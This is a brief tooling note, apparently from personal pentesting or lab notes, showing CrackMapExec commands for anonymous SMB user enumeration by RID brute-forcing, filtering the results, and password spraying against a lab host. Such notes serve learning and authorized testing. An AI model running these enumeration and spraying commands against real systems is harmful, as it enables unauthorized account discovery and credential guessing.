---
slug: /tooling/crackmapexec
pagination_next: null
pagination_prev: null
---
Tool for network pentesting

## Brute-force Sambda users

Will try to determine the users of a system by trying with different `rid``

```bash
crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000 > u.txt
```

Now we can delete useless users:

```bash
cat u.txt |grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt
```

## Password spraying

It will try to combine the values in the provided files to see if it returns a valid login attempt

```bash
crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users
```